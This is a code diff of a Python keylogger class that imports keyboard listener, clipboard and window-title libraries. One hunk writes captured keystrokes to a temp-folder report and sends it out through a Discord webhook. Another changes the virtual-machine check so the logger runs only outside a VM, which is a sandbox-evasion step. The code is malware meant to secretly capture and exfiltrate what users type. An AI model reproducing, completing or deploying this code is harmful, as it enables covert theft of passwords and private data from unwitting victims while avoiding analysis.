@@ -1,21 +1,21 @@
 import os
 import zlib
 import unicodedata
-from threading import Timer
-from datetime import datetime
-from discord_webhook import DiscordWebhook, DiscordEmbed
-from pynput.keyboard import Listener, Key
-import pyperclip
-import keyboard
-import win32gui
-import re
 import subprocess
 import ctypes
 import platform
 import time
-import psutil
+import re
+from datetime import datetime
+from threading import Timer
 from concurrent.futures import ThreadPoolExecutor
+import pyperclip
+import keyboard
+import psutil
+from pynput.keyboard import Listener, Key
+from discord_webhook import DiscordWebhook, DiscordEmbed
 from dotenv import load_dotenv
+import win32gui
 
 load_dotenv()
 
@@ -156,7 +156,7 @@ class Keylogger:
             try:
                 path = os.environ["temp"] + "\\report.txt"
                 with open(path, 'w+') as file:
-                    file.write(f"Keylogger Report From {self.username} Time: {self.end_dt}\n\n")
+                    file.write(f"Keylogger Report From ({self.username}) Time: {self.end_dt}\n\n")
                     file.write(self.log)
                 with open(path, 'rb') as f:
                     webhook.add_file(file=f.read(), filename='report.txt')
@@ -180,7 +180,7 @@ class Keylogger:
         timer.start()
 
     def start(self):
-        if self.is_vm():
+        if not self.is_vm():
             self.start_dt = datetime.now()
             with Listener(on_release=self.callback) as listener:
                 self.report()
